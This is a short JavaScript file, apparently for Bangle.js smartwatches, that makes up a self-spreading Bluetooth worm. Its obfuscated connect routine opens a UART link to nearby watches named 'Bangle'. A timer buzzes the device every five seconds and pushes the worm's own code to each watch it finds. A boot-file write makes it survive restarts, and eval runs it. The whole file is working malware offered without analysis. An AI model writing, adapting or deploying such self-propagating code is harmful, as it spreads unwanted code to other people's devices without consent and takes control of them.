let WORM_MAIN = `
let connect = function(r){var k,l,m,n,f,h={write:function(a){return new Promise(function b(g,e){a.length?(n.writeValue(a.substr(0,20)).then(function(){b(g,e)}).catch(e),a=a.substr(20)):g()})},disconnect:function(){return k.disconnect()},eval:function(a){return new Promise(function(c,g){function e(){var d=b.indexOf("\n");if(0<=d){clearTimeout(p);f=p=void 0;var q=b.substr(0,d);try{c(JSON.parse(q))}catch(t){g(q)}b.length>d+1&&h.emit("data",b.substr(d+1))}}var b="";var p=setTimeout(e,5E3);f=function(d){b+=d;0<=b.indexOf("\n")&&e()};h.write("\u0003\u0010Bluetooth.write(JSON.stringify("+a+")+'\\n')\n").then(function(){})})}};return r.gatt.connect().then(function(a){k=a;return k.getPrimaryService("6e400001-b5a3-f393-e0a9-e50e24dcca9e")}).then(function(a){l=a;return l.getCharacteristic("6e400002-b5a3-f393-e0a9-e50e24dcca9e")}).then(function(a){n=a;return l.getCharacteristic("6e400003-b5a3-f393-e0a9-e50e24dcca9e")}).then(function(a){m=a;m.on("characteristicvaluechanged",function(c){c=E.toString(c.target.value.buffer);f?f(c):h.emit("data",c)});return m.startNotifications()}).then(function(){return h})};
let WORM_PAYLOAD = setInterval(() => {
	Bangle.buzz();
	console.log('Buzz!');
	NRF.requestDevice({ filters: [{ namePrefix: 'Bangle' }] }).then((dev) => {
		connect(dev).then((u) => u.write(WORM_MAIN));
	});
}, 5000);

require('Storage').write('worm.boot.js', WORM_MAIN + '\\n' + 'eval(WORM_MAIN);' + '\\n');
`;

eval(WORM_MAIN);
